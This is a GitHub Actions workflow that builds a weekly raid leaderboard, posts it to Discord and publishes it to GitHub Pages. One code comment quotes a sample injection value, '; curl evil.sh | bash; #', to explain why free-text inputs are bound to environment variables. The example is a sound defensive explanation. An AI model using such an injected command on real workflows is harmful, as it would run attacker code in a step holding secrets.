name: Weekly Guild Board

on:
  schedule:
    # Every Tuesday at 13:00 UTC (9 AM ET) — right before NA reset,
    # so it captures the full previous raid week.
    - cron: "0 13 * * 2"
  # This adds the "Run workflow" button so officers can post/repost
  # the board manually any time (e.g., after updating the roast).
  workflow_dispatch:
    inputs:
      roast:
        description: "Override the roast of the week"
        required: false
      roast_winner:
        description: "Who said the roast"
        required: false
      roast_target:
        description: "Who the roast is aimed at"
        required: false
      difficulty:
        description: "Override raid difficulty (normal, heroic, mythic)"
        required: false
      lookback:
        description: "Override lookback days"
        required: false
      dry_run:
        description: "Dry run only (do not post to Discord)"
        type: boolean
        required: false

jobs:
  post-board:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Check out repo
        uses: actions/checkout@v5

      - name: Set up Python
        uses: actions/setup-python@v7
        with:
          python-version: "3.12"

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Install fonts for board rendering
        run: sudo apt-get update -qq && sudo apt-get install -y -qq fonts-dejavu-core

      # Chromium serves BOTH render paths: `paper` drives the live site to its
      # flat put-down edition and photographs page one, the above-the-fold
      # teaser and page two; `classic` screenshots this repo's own template.
      - name: Install Chromium for the renderer
        run: python -m playwright install --with-deps chromium

      - name: Run tests
        run: pytest

      # THE PARITY GATE, before any secret is in the environment.
      # THE PAPER IS THE POST: the attachment is a photograph of the website's
      # newspaper, which is built in another repo on another schedule. If a
      # block quietly left that sheet, the shot would still succeed and the
      # guild would simply stop being told something it used to be told. This
      # step is the only thing that would notice. One GET, no browser, no
      # credentials -- so a regressed paper kills the run early and loudly.
      #
      # Exit 1 = a kept datum vanished -> the job FAILS and nothing is posted.
      # Exit 2 = the page could not be fetched -> a fetch fault is not a parity
      #          verdict, so the run continues and leaderboard.py falls back to
      #          the classic renderer for the week.
      # Skipped entirely on `renderer: classic`.
      - name: Parity gate - the paper still carries every kept datum
        run: |
          renderer=$(python -c "import yaml; print(yaml.safe_load(open('config.yml')).get('renderer', 'classic'))")
          if [ "$renderer" != "paper" ]; then
            echo "renderer: $renderer -- the paper is not the post this week; gate skipped."
            exit 0
          fi
          set +e
          python scripts/check_paper_parity.py
          code=$?
          set -e
          if [ "$code" = "1" ]; then
            echo "::error title=Paper parity::A datum the weekly board used to publish is no longer on the paper. See the log above; fix the site or move the entry to 'dropped' in parity_manifest.yml."
            exit 1
          fi
          if [ "$code" = "2" ]; then
            echo "::warning title=Paper unreachable::Could not fetch the paper; the post will fall back to the classic renderer."
          fi
          exit 0

      - name: Build and post the board
        env:
          WCL_CLIENT_ID: ${{ secrets.WCL_CLIENT_ID }}
          WCL_CLIENT_SECRET: ${{ secrets.WCL_CLIENT_SECRET }}
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          DISCORD_BOT_TOKEN: ${{ secrets.DISCORD_BOT_TOKEN }}
          # The dispatch inputs are free text. They are bound to env vars here
          # and read as "$VAR" below — never spliced into the script body with
          # ${{ }}. Otherwise a roast of  '; curl evil.sh | bash; #  runs as
          # shell in this step, which is the step that holds every secret.
          IN_ROAST: ${{ github.event.inputs.roast }}
          IN_ROAST_WINNER: ${{ github.event.inputs.roast_winner }}
          IN_ROAST_TARGET: ${{ github.event.inputs.roast_target }}
          IN_DIFFICULTY: ${{ github.event.inputs.difficulty }}
          IN_LOOKBACK: ${{ github.event.inputs.lookback }}
          IN_DRY_RUN: ${{ github.event.inputs.dry_run }}
        run: |
          args=()
          if [ -n "$IN_ROAST" ]; then
            args+=(--roast "$IN_ROAST")
          fi
          if [ -n "$IN_ROAST_WINNER" ]; then
            args+=(--roast-winner "$IN_ROAST_WINNER")
          fi
          if [ -n "$IN_ROAST_TARGET" ]; then
            args+=(--roast-target "$IN_ROAST_TARGET")
          fi
          if [ -n "$IN_DIFFICULTY" ]; then
            args+=(--difficulty "$IN_DIFFICULTY")
          fi
          if [ -n "$IN_LOOKBACK" ]; then
            args+=(--lookback "$IN_LOOKBACK")
          fi
          if [ "$IN_DRY_RUN" == "true" ]; then
            args+=(--dry-run)
          fi
          python leaderboard.py "${args[@]}"

      - name: Publish web board to GitHub Pages
        env:
          WEB_BOARD_TOKEN: ${{ secrets.WEB_BOARD_TOKEN }}
        run: |
          if [ ! -f site/index.html ]; then
            echo "No web board rendered this run; skipping publish."
            exit 0
          fi
          if [ -z "$WEB_BOARD_TOKEN" ]; then
            echo "WEB_BOARD_TOKEN secret not set; skipping web publish (see README 'Web board')."
            exit 0
          fi
          repo=$(python -c "import yaml; print((((yaml.safe_load(open('config.yml')).get('display') or {}).get('web_board') or {}).get('repo') or ''))")
          if [ -z "$repo" ]; then
            echo "display.web_board.repo not set in config.yml; skipping."
            exit 0
          fi
          remote="https://github.com/${repo}.git"
          # The token goes in an Authorization header, not in the remote URL.
          # A URL-embedded token gets persisted into pages/.git/config on the
          # runner's disk, where any later step -- or an uploaded artifact --
          # can read it back out. The header form leaves nothing on disk.
          auth="AUTHORIZATION: basic $(printf 'x-access-token:%s' "$WEB_BOARD_TOKEN" | base64 -w0)"
          # Preserve history: build on the existing gh-pages so the week
          # archive accumulates instead of being wiped every Tuesday.
          if git -c http.extraheader="$auth" clone -q --depth 1 --branch gh-pages "$remote" pages 2>/dev/null; then
            echo "Extending existing gh-pages."
          else
            mkdir -p pages
            git -C pages init -q -b gh-pages
            echo "Starting a fresh gh-pages."
          fi
          git -C pages config user.email "action@github.com"
          git -C pages config user.name "GitHub Action"
          mkdir -p pages/archive pages/data
          week=$(date -u +%F)
          cp site/index.html pages/index.html
          cp site/index.html "pages/archive/${week}.html"
          # State snapshot per week — raw material for future trend graphs
          [ -f board_state.json ] && cp board_state.json "pages/data/${week}-state.json"
          [ -f web_stats.json ] && cp web_stats.json "pages/data/${week}-web-stats.json"
          # Manifest the archive dropdown reads (newest first)
          (cd pages/archive && ls -1 *.html 2>/dev/null | sed 's/\.html$//' | sort -r \
            | python -c "import json,sys; print(json.dumps([l.strip() for l in sys.stdin if l.strip()]))" \
            > index.json)
          cd pages
          git add -A
          if git diff --cached --quiet; then
            echo "Web board unchanged; nothing to publish."
          else
            git commit -q -m "Weekly web board ${week}"
            git -c http.extraheader="$auth" push -q "$remote" gh-pages
            echo "Web board published (archive week ${week})."
          fi

      - name: Commit roster cache and board state
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Branch names may contain shell metacharacters; bind, don't splice.
          REF_NAME: ${{ github.ref_name }}
        run: |
          git config --local user.email "action@github.com"
          git config --local user.name "GitHub Action"
          git add roster_cache.json
          [ -f board_state.json ] && git add board_state.json
          [ -f web_stats.json ] && git add web_stats.json
          if git diff --cached --quiet; then
            echo "No cache/state changes to commit."
          else
            git commit -m "Update roster cache and board state [skip ci]"
            # The run leaves other tracked files modified in the workspace
            # (roster_reconciliation.json is regenerated every board build).
            # Everything we want is committed above; drop the leftovers or
            # `git pull --rebase` refuses and the commit dies with the
            # runner — which is exactly how the 2026-07-27 roster refresh
            # was lost the first time.
            git checkout -- .
            if git pull --rebase origin "$REF_NAME"; then
              git push
            else
              for f in roster_cache.json board_state.json web_stats.json; do
                git checkout --ours "$f" 2>/dev/null && git add "$f" || true
              done
              git rebase --continue
              git push
            fi
          fi
